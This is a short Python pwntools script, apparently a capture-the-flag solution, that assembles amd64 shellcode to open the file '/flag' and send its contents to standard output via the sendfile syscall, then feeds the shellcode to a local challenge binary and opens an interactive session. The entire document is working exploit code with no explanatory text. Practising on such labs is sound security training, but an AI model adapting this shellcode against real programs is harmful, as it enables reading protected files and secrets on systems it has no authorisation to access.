	#!/usr/bin/python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'error'
context.arch = "amd64"
elf = context.binary = ELF('/challenge/ello-ackers')

shellcode = asm("""
#open("/flag",0,0)
	push 0x2
	pop rax
	push 0x0
	pop rsi
	push 0x616c662f
	mov dword ptr [rsp  + 4], 0x67
	push rsp
	pop rdi
	push 0x0
	pop rdx
	syscall
#sendfile(1,open("/flag",0,0),0,0x1000)
	push rax
	pop rsi
	push 0x1
	pop rdi
	push 40
	pop rax
	push 0x0
	pop rdx
	push 0x1000
	pop r10
	syscall
	""")

io = process()
io.send(shellcode)
io.interactive()
